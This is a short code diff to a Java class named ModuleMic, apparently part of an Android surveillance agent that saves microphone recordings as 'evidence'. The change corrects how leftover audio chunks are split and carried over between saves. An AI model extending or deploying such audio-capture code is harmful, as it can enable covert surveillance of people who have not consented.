@@ -251,25 +251,36 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 					Check.log(TAG + " (saveRecorderEvidence): pos = " + pos + " chunklen = " + chunklen);
 				}
 			} while (pos < data.length);
-			
-			//pos=pos-1;
 
-			// portion of microchunk to be saved for the next time
-			
-			int unfinishedLen = (chunklen - (pos - data.length) + 1) % chunklen;
-			int unfinishedPos = pos - chunklen -1;
-			
+			int unfinishedLen = 0;
+			int unfinishedPos = 0;
+
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (saveRecorderEvidence): unfinishedLen = " + unfinishedLen + " unfPos: " + unfinishedPos + " chunklen: " + chunklen);
+				Check.log(TAG + " (saveRecorderEvidence), data.length+1: " + (data.length + 1) + " pos: " + pos);
+			}
+			
+			if (pos > data.length + 1) {
+
+				// portion of microchunk to be saved for the next time
+
+				unfinishedLen = (chunklen - (pos - data.length) + 1) % chunklen;
+				unfinishedPos = pos - chunklen - 1;
+
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (saveRecorderEvidence): unfinishedLen = " + unfinishedLen + " unfPos: "
+							+ unfinishedPos + " chunklen: " + chunklen);
+				}
+				
+				unfinished = Utils.copy(data, unfinishedPos, data.length - unfinishedPos);
+				if (unfinished.length > 0) {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (saveRecorderEvidence): removing unfinished from data");
+					}
+					data = Utils.copy(data, 0, unfinishedPos);
+				}
 			}
 
-			unfinished = Utils.copy(data, unfinishedPos, data.length - unfinishedPos);
-			if (unfinished.length > 0) {
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (saveRecorderEvidence): removing bias from data");
-				}
-				data = Utils.copy(data, 0, unfinishedPos);
-			}
+
 
 			if (data.length > 0) {
 				new LogR(EvidenceType.MIC, getAdditionalData(), data);
